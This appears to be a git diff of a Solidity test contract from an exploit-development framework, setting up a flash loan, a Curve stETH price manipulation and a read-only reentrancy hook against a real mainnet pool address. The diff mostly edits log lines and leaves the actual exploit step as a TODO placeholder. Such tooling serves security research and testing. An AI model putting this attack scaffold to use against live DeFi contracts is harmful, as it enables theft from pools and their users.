@@ -17,7 +17,7 @@ contract PriceManipulationExample is PriceManipulation, FlashLoan, Tokens {
         console.log("---------------------------------------------------------------------------");
         console.log("Curve Virtual Price BEFORE:", IPool(0xDC24316b9AE028F1497c275EB9192a3Ea0f67022).get_virtual_price());
         // Deal ether to cover fees and losses
-        deal(EthereumTokens.NATIVE_ASSET, address(this), 4 ether);
+        deal(EthereumTokens.NATIVE_ASSET, address(this), 3.5 ether);
         takeFlashLoan(FlashLoanProviders.BALANCER, EthereumTokens.WETH, 50000e18);
 
     }
@@ -27,13 +27,12 @@ contract PriceManipulationExample is PriceManipulation, FlashLoan, Tokens {
             console.log("---------------------------------------------------------------------------");
             IWrapped(address(EthereumTokens.wstETH)).unwrap(50000e18);
             console.log("ETH   :", address(this).balance);
-            console.log("WETH :", EthereumTokens.WETH.balanceOf(address(this)));
             console.log("stETH :", EthereumTokens.stETH.balanceOf(address(this)));
 
             manipulatePrice(PriceManipulationProviders.CURVE, EthereumTokens.ETH, EthereumTokens.stETH, 50000e18, 50000e18);
             
             console.log("---------------------------------------------------------------------------");
-            console.log("PAY BACK stETH");
+            console.log("Pay back stETH flash loan");
             console.log("ETH   :", address(this).balance);
             console.log("stETH :", EthereumTokens.stETH.balanceOf(address(this)));
             // Wrap stETH to pay back flash loan
@@ -55,7 +54,7 @@ contract PriceManipulationExample is PriceManipulation, FlashLoan, Tokens {
             // Wrap Ether to pay back balancer loan
             IWrappedEther(address(EthereumTokens.WETH)).deposit{value: address(this).balance}();
             console.log("---------------------------------------------------------------------------");
-            console.log("PAY BACK WETH");
+            console.log("Pay back WETH flash loan");
             console.log("ETH   :", address(this).balance);
             console.log("WETH  :", EthereumTokens.WETH.balanceOf(address(this)));
             console.log("stETH :", EthereumTokens.stETH.balanceOf(address(this)));
@@ -67,13 +66,12 @@ contract PriceManipulationExample is PriceManipulation, FlashLoan, Tokens {
         console.log("---------------------------------------------------------------------------");
         console.log("Curve Virtual Price AFTER:", IPool(0xDC24316b9AE028F1497c275EB9192a3Ea0f67022).get_virtual_price());
         console.log("ETH   :", address(this).balance);
+        console.log("WETH  :", EthereumTokens.WETH.balanceOf(address(this)));
         console.log("stETH :", EthereumTokens.stETH.balanceOf(address(this)));
         console.log("wstETH:", EthereumTokens.wstETH.balanceOf(address(this)));
     }
 
     receive() external payable override {
-        // console.log(uint256(currentPriceOracleProvider()));
-        // console.log(currentPriceOracleProvider() == PriceManipulationProviders.CURVE);
         if (currentPriceOracleProvider() == PriceManipulationProviders.CURVE) {
             // Execute read only reentrancy
             // Caller should be curve pool
@@ -81,6 +79,8 @@ contract PriceManipulationExample is PriceManipulation, FlashLoan, Tokens {
             console.log("Curve Virtual Price DURING:", IPool(0xDC24316b9AE028F1497c275EB9192a3Ea0f67022).get_virtual_price());
             console.log("ETH   :", address(this).balance);
             console.log("stETH :", EthereumTokens.stETH.balanceOf(address(this)));
+            console.log("Execute price manipulation attack HERE");
+            // TODO: Add exploit logic
         }
     }
 
